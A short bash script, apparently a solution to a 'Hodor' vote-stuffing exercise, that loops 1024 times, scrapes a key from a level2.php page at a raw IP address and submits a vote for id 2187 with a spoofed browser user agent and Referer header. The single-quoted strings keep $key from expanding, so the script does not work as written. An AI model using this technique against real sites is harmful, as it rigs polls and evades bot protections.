#!/bin/bash


for i in $(seq 1 1024); do
    key=$(curl -X POST http://158.69.76.135/level2.php -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66" -H "Referer: http://158.69.76.135/level2.php" | grep -oE '\w{15,}')
    curl -s -X POST http://158.69.76.135/level2.php -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66" -d 'id=2187&holdthedoor=submit&key=$key' -vvv -b 'HoldTheDoor=$key' -H "Referer: http://158.69.76.135/level2.php" | head
done
